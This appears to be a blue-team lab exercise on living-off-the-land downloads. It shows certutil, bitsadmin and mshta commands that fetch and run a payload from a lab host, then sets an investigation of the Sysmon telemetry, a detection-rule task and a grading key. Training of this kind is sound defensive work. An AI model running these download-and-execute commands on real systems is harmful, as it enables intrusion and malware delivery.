# S06 — Living-off-the-Land Download (LOLBins)

**Tier 2 · ATT&CK: T1105 (Ingress Tool Transfer), T1218 (Signed Binary Proxy Execution)**

## Story
No PowerShell this time. A trusted, signed Windows binary was used to pull a file from the internet. This is the technique that slips past "block powershell" rules. Which binary, what did it fetch, and did it execute?

## Lab setup
Same `vic-win` telemetry as S05. Attacker hosts a payload on `10.10.10.5`.

## Run it
Randomize which LOLBin:
```cmd
:: certutil
certutil -urlcache -split -f http://10.10.10.5/payload.exe C:\Users\Public\p.exe & C:\Users\Public\p.exe

:: bitsadmin
bitsadmin /transfer job /download /priority normal http://10.10.10.5/payload.exe C:\Users\Public\p.exe

:: mshta / regsvr32 remote (proxy execution)
mshta http://10.10.10.5/a.hta
```
Or `Invoke-AtomicTest T1105` / `T1218.010`.

## Cleanup / revert
Revert to `baseline`.

## What telemetry this generates
- **Sysmon 1 / Event 4688**: `certutil.exe`/`bitsadmin.exe`/`mshta.exe` with a URL on the command line. Signed binaries doing download jobs.
- **Sysmon 3**: the outbound connection from that LOLBin.
- **Sysmon 11** (file create): the dropped `p.exe`, then **Sysmon 1** for its execution. The parent is the LOLBin.

## Your investigation (fill cold)
Which LOLBin, what URL, what file landed where? Did the payload execute (child process off the LOLBin)? Why is a *signed Microsoft binary* making a web request the anomaly here, not the binary itself? What would a naive "these are trusted, ignore" allowlist have missed?

## Detection engineering
Command-line rules for `certutil`/`bitsadmin`/`mshta`/`regsvr32` with `http`/`urlcache`/`/transfer` tokens, or Sysmon-3 alerts where the process image is a known LOLBin. Ship one, and note it is behavior-based, not signature-based. That is the point.

<details>
<summary>Grading key — do not open until your verdict is written</summary>

- Sealed truth: which LOLBin, URL, dropped path, and whether the payload ran.
- **Good:** you name the LOLBin, tie its Sysmon-3 egress to the file-create to the child execution, and articulate *why signed ≠ safe here.* Bonus: you note the same detection logic generalizes across all the LOLBins.
- **Miss:** dismissing `certutil` as a normal cert tool — context (a URL + a dropped exe) is what makes it malicious, and reading that context is the rep.
</details>
